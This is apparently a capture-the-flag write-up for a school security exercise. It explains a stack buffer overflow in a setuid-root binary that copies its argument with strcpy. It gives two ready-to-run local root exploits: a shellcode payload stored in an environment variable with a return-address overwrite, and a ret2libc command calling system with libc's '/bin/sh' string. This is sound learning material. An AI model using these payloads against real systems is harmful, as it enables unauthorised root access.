# zaz

## Shellcode (2 solutions)

decompile with ghidra

```c
bool main(int param_1,int param_2)
{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}
```

so in use_me or whatever that binary is named oh right its exploit_me, oh boy
anyway
there're at least two methods solve this.

both methods essentially open a shell, now the exploit_me binary belongs to root
so any shell it opens will be opened as root and will respond accordingly
to a simple check with the "whoami" command

the methods are ret2libc and a simple shellcode, both done through an old
vulnerability of buffer overflow.

ltace/gdb shows that the binary calls for strcpy() of argv[1] the prints it.
Stcpy does no check for length of source of data, copying everything to buff;

re-check with gdb if needed, or just read this or smth: 

https://www.cs.virginia.edu/~evans/cs216/guides/x86.html

TLDR: we have our cpy buffer at *ebx, it's length is 140bytes (check sub instruction
in main, there's an allocation of 144 bytes being the buff + ptr, confirm with 141-length string if needed)

Right after that buff there goes *eip, which contains the address of THE NEXT INSTRUCTION TO BE DONE

so basically we can overwrite this instruction with smth else, smth that will call for \bin\sh

==============================================================================

1. The first method is a shellcode. Read about it if you want,
basically it's machine code which if executed actially launches a new shell.
So what we can do is for instance export it to env, get it's address and overwrite EIP with it.
Boom, we got it working.


export PEPEGA=`python -c 'print("\x90"*4 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`


./exploit_me python -c "print('A' * 140 + '\xa7\xfe\xff\xbf')"

The address here is changable, each time we export this shit or re-launch the vm the address may and probably will change.
That's ok, we can easily check it with a nice script like this:

#include <stdio.h>
#include <stdlib.h>

int main()
{
	printf("%p\n", getenv("PEPEGA"));
}

The 140 being the buff size, so after it's all used up we are effectivly overwriting the EIP value,
making the binary execute smth else.



===============================================================================

2. The second method would be writing actual system("\bin\sh")
Now, gdb allows us to do get all the info we need to do it.

We find "system"'s addres fairly easy, we just need to launch the binary and ask gdb nicely

> p system
> address

Now making it eat "bin\sh" has proven to be a bit more of a fuss, all my attempts to feed it as an
env var failed completely for reasons unknown. Then I decided to read through my notes from rainfall
a bit more carefully, only to find that libc actually contains a mention of "bin\sh" in it, an old 
and well known thing.

So we find it's address with this: 

https://wiki.bi0s.in/pwning/return2libc/return-to-libc/


info proc map < - prints all the mapped addresses as intervals for currently launched binary
now, the binary having libc has all of it mapped.
including the "bin\sh" string.

we will have smth like this in our results:

0xf7e20000 0xf7fcd000   0x1ad000        0x0 /home/vignesh/Documents/libc.so.6
0xf7fcd000 0xf7fce000     0x1000   0x1ad000 /home/vignesh/Documents/libc.so.6
0xf7fce000 0xf7fd0000     0x2000   0x1ad000 /home/vignesh/Documents/libc.so.6
0xf7fd0000 0xf7fd1000     0x1000   0x1af000 /home/vignesh/Documents/libc.so.6

being the libc mapped and all it's addresses

So, what we have left to do is this:

(gdb) find 0xf7e20000, 0xf7fd1000 , "/bin/sh"
with first address being the beginning of first libc part, second address being the last libc part

1 pattern found.
(gdb) x/s 0xf7f78e8b
0xf7f78e8b: "/bin/sh"

(yeah, that's from the article, in vm we will have smth else)

The actual result brings us to the following: 


./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "pepe" + "\x58\xcc\xf8\xb7"')

Here we see the 140 bytes again to overwrite the buffer, next therese's an address of "system",
that goes into iep. Yet we don't stop, after system launches, it will look into the memory for the
following things: exit fucntion address, string argument address.

Now, disas system if you want, I simply did read it in the same article and assumed it was true,
anyway, TLDR: that's what system does, so first we need to write 4 bytes, we can actually
write an address of some function here to make it work properly, but used a 4 bytes of "pepe",
coz who doesn't like pepe, right?

Anyway, then we get the string arg address, and that is the one of "bin/sh" from libc, it doesn't really
care where it comes from, it just need to read the line.

boom, we r root.